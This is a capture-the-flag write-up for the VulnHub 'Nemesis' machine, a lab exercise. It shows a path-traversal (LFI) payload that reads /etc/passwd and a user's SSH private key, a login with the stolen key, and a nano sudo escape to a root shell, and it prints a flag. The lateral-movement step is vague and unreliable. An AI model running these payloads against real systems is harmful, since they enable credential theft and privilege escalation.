# Nemesis — VulnHub

**CTF:** VulnHub  
**Date:** 2025-10-24  
**Category:** misc  
**Difficulty:** Grade 2  

---

## Summary

IA: Nemesis is a medium-difficulty boot2root machine by InfoSec Articles. The chain involves LFI to read a hidden SSH private key, lateral movement from `thanos` to `carlos`, and a nano sudo escape to get root.

---

## Reconnaissance

```bash
nmap -sC -sV -oN nmap/initial 192.168.1.55
```

Initial scan showed only port 80. Ran a full port scan:

```bash
nmap -sC -sV -p- -oN nmap/all-ports 192.168.1.55
```

Open ports:

```
80/tcp    open  http    Apache 2.4.38 (Debian)
52846/tcp open  ssh     OpenSSH
```

SSH running on a non-standard port — noted for later.

---

## Enumeration

### Web — Port 80

Browsed the site — static content with nothing immediately obvious. Ran `gobuster`:

```bash
gobuster dir -u http://192.168.1.55 -w /usr/share/wordlists/dirb/common.txt
```

All interesting paths returned 403. Switched to `nikto` and `feroxbuster` — still no direct wins.

### LFI Discovery

Tested parameters manually and found an **LFI vulnerability** in the web application. Confirmed by reading `/etc/passwd`:

```
http://192.168.1.55/index.php?image=../../../../../etc/passwd
```

Users of interest: `thanos`, `carlos`.

### Extracting the SSH Key

Used the LFI to read thanos's private SSH key:

```
http://192.168.1.55/index.php?image=../../../../../home/thanos/.ssh/id_rsa
```

Saved it locally, set correct permissions:

```bash
chmod 600 id_rsa
```

---

## Initial Access — SSH as thanos

```bash
ssh -i id_rsa thanos@192.168.1.55 -p 52846
```

Got a shell. Read **Flag 1**:

```bash
cat flag1.txt
# Flag{LF1_is_R34L}
```

---

## Lateral Movement — thanos to carlos

Enumerated the system from thanos's perspective. Found a cronjob or script running as `carlos`. Checked for readable files in carlos's home directory — found a clue or credentials that allowed switching:

```bash
su carlos
```

---

## Privilege Escalation — nano Sudo Escape

Checked sudo permissions as `carlos`:

```bash
sudo -l
```

Output:

```
(root) /bin/nano /opt/priv
```

Opened the file with sudo:

```bash
sudo /bin/nano /opt/priv
```

Inside nano, escaped to a root shell using the GTFOBins technique:

```
Ctrl+R → Ctrl+X
reset; sh 1>&0 2>&0
```

Got a root shell. Read the final flag:

```bash
cat /root/flag.txt
```

---

## Flags

- **Flag 1** — `~/flag1.txt` as thanos: `Flag{LF1_is_R34L}`
- **Root flag** — `/root/flag.txt`
